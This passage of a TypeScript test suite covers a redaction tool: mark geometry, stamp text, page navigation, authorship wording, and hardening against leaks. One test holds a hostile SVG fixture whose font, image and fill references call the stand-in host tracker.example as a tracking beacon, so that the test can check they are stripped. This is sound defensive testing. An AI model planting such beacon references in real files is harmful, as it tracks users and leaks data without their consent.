  // box it is inscribed in, so rounding a bar in place would uncover four
  // slivers of exactly what the user marked.
  const inShape = (s: any, x: number, y: number): boolean => {
    if (x < s.x0 || x > s.x1 || y < s.y0 || y > s.y1) return false;
    const [tl, tr, br, bl] = s.radii;
    const corner = (cx: number, cy: number, r: number, insideX: boolean, insideY: boolean): boolean => {
      if (!r) return true;
      if (insideX ? x > cx : x < cx) return true;
      if (insideY ? y > cy : y < cy) return true;
      return Math.hypot(x - cx, y - cy) <= r + 1e-9;
    };
    return corner(s.x0 + tl, s.y0 + tl, tl, true, true)
      && corner(s.x1 - tr, s.y0 + tr, tr, false, true)
      && corner(s.x1 - br, s.y1 - br, br, false, false)
      && corner(s.x0 + bl, s.y1 - bl, bl, true, false);
  };

  const rects = [
    { x0: 40, y0: 40, x1: 140, y1: 62 },   // an ordinary text-line bar
    { x0: 0, y0: 0, x1: 30, y1: 12 },      // hard against the top-left corner
    { x0: 270, y0: 138, x1: 300, y1: 150 },// hard against the bottom-right
    { x0: 10, y0: 10, x1: 13, y1: 13 },    // smaller than the radius
  ];
  for (const rect of rects) {
    for (const radius of [0, 1, 3, 7]) {
      const s = paintedShape(rect, radius, 300, 150);
      // Containment, sampled densely along the requested rect INCLUDING its
      // corners, which is where an un-inflated rounded bar leaks.
      for (let x = rect.x0; x <= rect.x1; x += 0.5) {
        for (const y of [rect.y0, (rect.y0 + rect.y1) / 2, rect.y1]) {
          assert.ok(inShape(s, x, y), `(${x},${y}) uncovered at radius ${radius} for ${JSON.stringify(rect)}`);
        }
      }
      for (let y = rect.y0; y <= rect.y1; y += 0.5) {
        for (const x of [rect.x0, rect.x1]) {
          assert.ok(inShape(s, x, y), `(${x},${y}) uncovered at radius ${radius}`);
        }
      }
      // The shape only ever GROWS, and never past the frame.
      assert.ok(s.x0 <= rect.x0 && s.y0 <= rect.y0 && s.x1 >= rect.x1 && s.y1 >= rect.y1);
      assert.ok(s.x0 >= 0 && s.y0 >= 0 && s.x1 <= 300 && s.y1 <= 150);
    }
  }
});

test('redact mark: a corner that had to clamp to the frame edge is painted square', () => {
  const { paintedShape } = loadGeom();
  // Clamping drags the arc centre inward, and a rounded corner there would cut
  // back into the very rectangle the inflation exists to protect.
  const s = paintedShape({ x0: 0, y0: 0, x1: 50, y1: 20 }, 3, 300, 150);
  assert.deepEqual(s.radii, [0, 0, 3, 0], 'only the corner away from both edges rounds');
  assert.equal(s.x0, 0);
  assert.equal(s.y0, 0);
  // Radius 0 is a plain rect with no rounding anywhere.
  assert.deepEqual(paintedShape({ x0: 10, y0: 10, x1: 20, y1: 20 }, 0, 300, 150),
    { x0: 10, y0: 10, x1: 20, y1: 20, radii: [0, 0, 0, 0] });
});

test('redact mark: the branded default paints the same box as solid, grown by its radius', async () => {
  const hooks = loadHooks();
  const bars = [drawn(20, 30, 50, 20)];
  const out = new TextDecoder().decode((await hooks.exportFile({
    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true, bars }),
    host: BARE_HOST,
  })).bytes);
  // Solid's square box is 9,28 → 81,52 (see the geometry test above). Branded
  // adds a 3-unit radius, so the PAINTED box is 6,25 → 84,55 and the corners
  // round back to exactly the square box's own corners.
  const m = /<path d="(M[^"]+)" fill="#14161a" fill-opacity="1"\/>/.exec(out);
  assert.ok(m, 'the branded mark is a rounded path');
  assert.equal(m![1], 'M9,25H81A3,3 0 0 1 84,28V52A3,3 0 0 1 81,55H9A3,3 0 0 1 6,52V28A3,3 0 0 1 9,25Z');
  // Never a translucent fill, in any style.
  assert.doesNotMatch(out, /fill-opacity="(?!1")/);
});

test('redact mark: the resolved ink and shape reach the PDF rebuild as additive opts', async () => {
  const hooks = loadHooks();
  let seen: any = null;
  const host = pdfHost({ pdf: { redact: async (_b: any, o: any) => { seen = o; return { bytes: PDF_OUT, pages: 2 }; } } });
  host.tokens = { colors: async () => [SEMANTIC('color.semantic.text', '#0C322C')] };
  await hooks.exportFile({
    model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), {
      bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }], style: 'stamped', stampLabel: 'Records office',
    }),
    host,
  });
  assert.ok(seen, 'host.pdf.redact was called');
  assert.equal(seen.color, '#0c322c', 'the brand tone crosses the bridge');
  assert.equal(seen.radius, 3);
  assert.equal(seen.label, 'Records office');
  assert.equal(seen.labelColor, '#ffffff', 'a light label on dark ink');
  // The bars themselves are unchanged in shape: the bridge owns the inflation.
  assert.deepEqual(seen.bars[0].page, 1);
});

test('redact mark: the stamp is the user\'s text, then the profile name, then the word', async () => {
  const { stampTextFor } = loadGeom();
  assert.equal(stampTextFor('Records office', 'Andy Fitzsimon'), 'Records office');
  assert.equal(stampTextFor('   ', 'Andy Fitzsimon'), 'Andy Fitzsimon');
  assert.equal(stampTextFor('', ''), 'REDACTED');
  assert.equal(stampTextFor(null, null), 'REDACTED');
  assert.equal(stampTextFor('x'.repeat(60), ''), 'x'.repeat(24), 'capped, never a paragraph');

  // End to end: it lands on the bar, on top of the opaque fill.
  const hooks = loadHooks();
  const profHost = { ...BARE_HOST, profile: { get: async () => ({ firstname: 'Ada', lastname: 'Lovelace', useDetails: true }) } };
  const out = new TextDecoder().decode((await hooks.exportFile({
    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), {
      svgVector: true, style: 'stamped', bars: [drawn(20, 30, 150, 20)],
    }),
    host: profHost,
  })).bytes);
  assert.match(out, /<path d="M[^"]+" fill="#14161a" fill-opacity="1"\/><text /, 'painted after (on top of) the fill');
  assert.match(out, />Ada Lovelace<\/text>/);
  // And nothing about it comes from the document.
  assert.doesNotMatch(out, /hushtoken|Jane Zebra/);
});

test('redact mark: a stamp that would repeat deleted content fails with its own sentence', async () => {
  const hooks = loadHooks();
  // The only user-typed string this export appends is the stamp. Telling the
  // user to change it is a far more useful failure than "this file could not be
  // redacted" — and it still fails closed, so nothing downloads either way.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">'
    + '<!-- CONFIDENTIAL --><text x="10" y="50">Visible</text></svg>';
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('c.svg', 'image/svg+xml', svgBytes(svg)), {
        svgVector: true, style: 'stamped', stampLabel: 'CONFIDENTIAL', bars: [drawn(10, 55, 180, 30)],
      }),
      host: BARE_HOST,
    }),
    /the stamp text repeats content this export deleted/
  );
});

test('redact mark: the label colour is chosen for contrast against the ink', () => {
  const { inkContrast } = loadGeom();
  assert.equal(inkContrast('#0c322c'), '#ffffff', 'a dark brand tone takes a light label');
  assert.equal(inkContrast('#14161a'), '#ffffff');
  assert.equal(inkContrast('#f2f0e8'), '#14161a', 'and a pale one takes a dark label');
  assert.equal(inkContrast('nonsense'), '#ffffff', 'unreadable falls back with the ink itself');
});

test('redact mark: the style select only accepts the three presets', () => {
  const { markStyleOf } = loadGeom();
  assert.equal(markStyleOf('solid'), 'solid');
  assert.equal(markStyleOf('branded'), 'branded');
  assert.equal(markStyleOf('stamped'), 'stamped');
  // Not a free style editor, and not a prototype-key hole either.
  assert.equal(markStyleOf('constructor'), 'branded');
  assert.equal(markStyleOf('toString'), 'branded');
  assert.equal(markStyleOf(undefined), 'branded');
});

// ─── format-only options hide themselves ─────────────────────────────────────

test('redact: the sniffed file type is published so format-only toggles can hide', async () => {
  const hooks = loadHooks();
  const kindOf = async (f: any): Promise<string> =>
    (await hooks.onInit({ model: modelFor(f), host: BARE_HOST }) as any).fileKind;
  assert.equal(await kindOf(fileRef('a.svg', 'image/svg+xml', svgBytes(DIRTY_SVG))), 'SVG');
  assert.equal(await kindOf(fileRef('a.pdf', 'application/pdf', svgBytes('%PDF-1.4\n%%EOF\n'))), 'PDF');
  assert.equal(await kindOf(fileRef('a.png', 'image/png', buildDirtyPng())), 'PNG');
  assert.equal(await kindOf(null), '', 'and it clears with the file, so a stale toggle cannot linger');

  // The manifest side of the same contract: the toggles are gated on it.
  const byId = (id: string): any => MANIFEST.inputs.find((i: any) => i.id === id);
  assert.deepEqual(byId('svgVector').showIf, { fileKind: 'SVG' });
  assert.deepEqual(byId('resign').showIf, { fileKind: 'PDF' });
  // And the field itself never renders: its showIf can never match its value.
  assert.equal(byId('fileKind').showIf.fileKind, '__never-rendered');
});

// ─── fit-to-width scrolling pages ────────────────────────────────────────────

/** A host whose pdf.pages answers with n identical A4-ish pages. */
function pagesHost(n: number): any {
  return pdfHost({
    pdf: {
      pages: async () => ({
        pages: Array.from({ length: n }, (_, i) => ({ svg: pageSvg(i + 1), page: i + 1, widthPt: 612, heightPt: 792 })),
        truncated: false,
      }),
    },
  });
}

test('redact (e2e): a multi-page PDF scrolls inside the stage with a page indicator', async () => {
  const rt = await createRuntime(redactTool(), pagesHost(3), {
    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
  });
  const html = rt.getHydrated();
  // The page stack lives in its OWN bounded scroller. Without it the canvas
  // grows to the summed height of every page and the shell scales the whole
  // document down to fit the stage — the unreadable strip this replaces.
  assert.match(html, /<div class="rd-scroll" data-page-scroll>/);
  assert.match(html, /class="rd-frame rd-pageframe" data-page="1"/);
  assert.match(html, /class="rd-frame rd-pageframe" data-page="3"/);
  // A quiet cue plus two buttons — a page frame sets touch-action:none, so a
  // finger on the page draws a bar and cannot scroll the list.
  assert.match(html, /<span class="rd-pagenow" data-page-now aria-live="polite">Page 1 of 3<\/span>/);
  assert.match(html, /<button type="button" class="rd-rail-btn" data-page-step="-1"/);
  assert.match(html, /<button type="button" class="rd-rail-btn" data-page-step="1"/);
});

test('redact (e2e): a single-page PDF gets no page navigation it does not need', async () => {
  const rt = await createRuntime(redactTool(), pagesHost(1), {
    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
  });
  const html = rt.getHydrated();
  assert.match(html, /<div class="rd-scroll" data-page-scroll>/, 'the scroller is harmless on one page');
  // Markup, not the wiring: the template script mentions both hooks by name.
  assert.doesNotMatch(html, /<span class="rd-pagenow"/);
  assert.doesNotMatch(html, /<button[^>]*data-page-step/);
});

// ─── authorship: what the fresh Content Credential actually records ──────────

test('redact (e2e): the sidebar states who the credential names, including when it can name nobody', async () => {
  // c2pa.sign present: without a signer the tool correctly says the credential
  // is unavailable instead, which is a different (also tested) sentence.
  const signer = { c2pa: { sign: async (b: any) => b } };
  const named = { ...pagesHost(1), ...signer, profile: { get: async () => ({ firstname: 'Ada', lastname: 'Lovelace', useDetails: true }) } };
  const rt = await createRuntime(redactTool(), named, {
    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC), resign: true,
  });
  const html = rt.getHydrated();
  assert.match(html, /signed as a new work: you \(Ada Lovelace\) as its author/);
  assert.match(html, /No ingredients and no thumbnail of the original travel with it\./);

  // "Use my details" off is the case a tool is most tempted to gloss over: the
  // shell will record no name at all, so the copy says exactly that.
  const anon = { ...pagesHost(1), ...signer, profile: { get: async () => ({ firstname: 'Ada', lastname: 'Lovelace' }) } };
  const rt2 = await createRuntime(redactTool(), anon, {
    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC), resign: true,
  });
  assert.match(rt2.getHydrated(), /no author name, because "Use my details" is off in your profile/);

  // And nothing about authorship is claimed when the credential is off.
  const rt3 = await createRuntime(redactTool(), named, {
    source: fileRef('doc.pdf', 'application/pdf', PDF_SRC),
  });
  assert.doesNotMatch(rt3.getHydrated(), /signed as a new work/);
});

// ─── round 4 hardening ───────────────────────────────────────────────────────

test('redact: an inlined SVG cannot fetch anything from the app\'s origin', () => {
  const { prepareInlineSvg } = loadGeom();
  // Rounds 1-3 put the source inside <img>, where SVG-as-image blocks every
  // external load for us. Inlining it into the live document moved that job
  // here: a hostile file that was merely OPENED must not report home, and the
  // empty state promises the file never leaves the device.
  const hostile = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100">
  <style>@font-face { font-family: t; src: url(https://tracker.example/f.woff2) }
    .a { fill: url("//tracker.example/g.svg#g") } .b { fill: url(#local) }</style>
  <image href="https://tracker.example/px.png?id=victim" x="0" y="0" width="10" height="10"/>
  <image xlink:href="beacon.png" x="0" y="0" width="10" height="10"/>
  <image href="data:image/png;base64,AAAA" x="0" y="0" width="10" height="10"/>
  <use href="#local"/>
  <rect fill="url(http://tracker.example/p.svg#p)" width="5" height="5"/>
</svg>`;
  const out = prepareInlineSvg(hostile, { natW: 200, natH: 100 });
  assert.doesNotMatch(out, /tracker\.example/, 'no remote reference survives inlining');
  assert.doesNotMatch(out, /beacon\.png/, 'a relative path resolves against the APP origin');
  // What the file legitimately carries is kept, or the preview stops being a
  // preview of the file the user is redacting.
  assert.match(out, /data:image\/png;base64,AAAA/);
  assert.match(out, /href="#local"/);
  assert.match(out, /fill:\s*url\(#local\)/);
});

test('redact: a deleted <use> takes its top-level <symbol> master with it', async () => {
  const hooks = loadHooks();
  const { prepareInlineSvg } = loadGeom();
  // The sprite idiom: the master is a <symbol> at the top level, NOT a <defs>
  // child, so a sweep scoped to <defs> left the text in the file with the
  // export gate silent — the <use> it deleted carries no text of its own.
  const sprite = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
  <symbol id="sec"><text x="0" y="10">TOPSECRETNAME</text></symbol>
  <use href="#sec" x="10" y="20"/>
  <text x="10" y="90">Public line</text>
</svg>`;
  const inline = prepareInlineSvg(sprite, { natW: 200, natH: 100 });
  const useIdx = Number(/<use[^>]*\bdata-rdn="(\d+)"/.exec(inline)![1]);
  const res = await hooks.exportFile({
    model: modelFor(fileRef('s.svg', 'image/svg+xml', svgBytes(sprite)), {
      svgVector: true,
      bars: [drawn(8, 14, 90, 22, { n: `m:${useIdx}` })],
    }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  assert.doesNotMatch(out, /TOPSECRETNAME/, 'the master goes with its only instance');
  assert.doesNotMatch(out, /<symbol/);
  assert.match(out, /Public line/, 'nothing else is disturbed');
});

test('redact resnap: a settled bar\'s addresses are rewritten to what it touches NOW', () => {
  const resnap = loadTemplateResnap();
  const { parseNodeMarks } = loadGeom();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  const nodes = [{ idx: 41, x: 10, y: 20, w: 40, h: 30 }];

  // Moved in the sidebar (or applied to the next file of a batch) so it now
  // fully contains a DIFFERENT node while still claiming the old one. Left
  // alone, vector export deletes node 7 — nowhere near a bar — and paints an
  // opaque rect over node 41, whose text stays in the file, recoverable in a
  // text editor, with the gate green because it only greps what was removed.
  const moved = { page: 1, x: 5, y: 15, w: 55, h: 45, n: 'm:7' };
  const out = resnap.plan([moved], 1, nodes, W, H, eff);
  assert.equal(out.changed, true, 'a stale address is a leak, measured or not');
  assert.deepEqual(parseNodeMarks(out.next[0].n), [41]);
  // The geometry is the user's and is not touched — only the addresses were wrong.
  assert.equal(out.next[0].x, 5);
  assert.equal(out.next[0].w, 55);
  // And it settles in one pass, like every other correction.
  assert.equal(resnap.plan(out.next, 1, nodes, W, H, eff).changed, false);
});

test('redact: a full-page backdrop is not an element a bar was aimed at', () => {
  const { isBackdropNode, snapBarToNodes } = loadGeom();
  const W = 612, H = 792;
  // A scanned page is ONE <image> at page size (engine pdf-svg emits exactly
  // that); an Illustrator export opens with a full-artboard <rect>.
  assert.equal(isBackdropNode({ x: 0, y: 0, w: 612, h: 792 }, W, H), true);
  assert.equal(isBackdropNode({ x: 10, y: 100, w: 200, h: 12 }, W, H), false);
  // With the backdrop excluded, a strike over one line grows to that line only.
  const nodes = [{ idx: 5, x: 60, y: 300, w: 180, h: 14 }];
  const s = snapBarToNodes({ x: 62, y: 305, w: 170, h: 4 }, nodes);
  assert.ok(s.w < W / 2 && s.h < 40, `a bar must not become the page: ${JSON.stringify(s)}`);
});

test('redact: the mark radius scales with the file, so Branded never reads as Solid', () => {
  const { markRadiusFor } = loadGeom();
  assert.equal(markRadiusFor('solid', 3024, 4032), 0, 'solid is square at any size');
  assert.equal(markRadiusFor('branded'), 3, 'no frame named: the base radius');
  assert.equal(markRadiusFor('branded', 612, 792), 4, 'a page keeps a slight softening');
  assert.equal(markRadiusFor('branded', 3024, 4032), 14, 'a phone photo gets a visible one');
  assert.equal(markRadiusFor('branded', 40, 40), 3, 'never below the base');
});

test('redact: the mirrored backdrop rule matches the hook\'s, case by case', () => {
  const hook = loadGeom();
  const tmpl = loadTemplateGeom();
  const cases = [
    [{ x: 0, y: 0, w: 612, h: 792 }, 612, 792],
    [{ x: 0, y: 0, w: 520, h: 792 }, 612, 792],
    [{ x: 0, y: 0, w: 612, h: 600 }, 612, 792],
    [{ x: 5, y: 5, w: 600, h: 780 }, 612, 792],
    [{ x: 0, y: 0, w: 10, h: 10 }, 0, 0],
  ] as const;
  for (const [nb, W, H] of cases) {
    assert.equal(tmpl.isBackdropNode(nb, W, H), hook.isBackdropNode(nb, W, H),
      `isBackdropNode ${JSON.stringify(nb)} in ${W}x${H}`);
  }
});

test('redact (e2e): the snap-to-cover promise is only made for a file that can be measured', async () => {
  // An SVG whose root declares neither a px width/height pair nor a viewBox has
  // no size the hook can map bars into, so it falls back to the <img> preview —
  // where nothing can be measured. isRaster is still false, so the hint used to
  // promise a bar "can never clip a word in half" for a file where no bar ever
  // grows. Absent a measurable frame, the tool says what it actually does.
  const sizeless = '<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">hello there</text></svg>';
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('sizeless.svg', 'image/svg+xml', svgBytes(sizeless)),
  });
  const html = rt.getHydrated();
  assert.doesNotMatch(html, /data-rdsvg/, 'no inline SVG, so no node bounds');
  assert.doesNotMatch(html, /can never clip a word in half/);
  assert.match(html, /Nothing in this file could be measured/);

  // A sized one inlines, and gets the promise.
  const sized = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><text x="10" y="20">hello there</text></svg>';
  const ok = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('sized.svg', 'image/svg+xml', svgBytes(sized)),
  });
  assert.match(ok.getHydrated(), /can never clip a word in half/);
});

test('redact (e2e): the stage marks itself not-ready while bars are still unmeasured', async () => {
  // Automation clicks [data-export-file] the moment it enables. On a measurable
  // file, bars that arrived as instructions have not been snapped to cover yet,
  // so the surface says so and the CLI/MCP browser tiers wait for it.
  const sized = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><text x="10" y="20">hello there</text></svg>';
  const src = fileRef('sized.svg', 'image/svg+xml', svgBytes(sized));

  const pending = await createRuntime(redactTool(), BARE_HOST, {
    source: src, bars: [{ page: 1, x: 8, y: 8, w: 60, h: 14 }],
  });
  // Match the STAGE tag, not the file: the markup carries a comment explaining
  // the attribute, which a bare search would find on every render.
  const onStage = (html: string) => /<div class="rd-stage"[^>]*\sdata-export-wait=/.test(html);
  assert.equal(onStage(pending.getHydrated()), true);

  // Measured on the canvas: nothing left to wait for.
  const settled = await createRuntime(redactTool(), BARE_HOST, {
    source: src, bars: [drawn(8, 8, 60, 14)],
  });
  assert.equal(onStage(settled.getHydrated()), false);

  // Flat pixels can never be measured, so the wait must never latch on.
  const raster = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('shot.png', 'image/png', buildDirtyPng()),
    bars: [{ page: 1, x: 8, y: 8, w: 60, h: 14 }],
  });
  assert.equal(onStage(raster.getHydrated()), false);
});
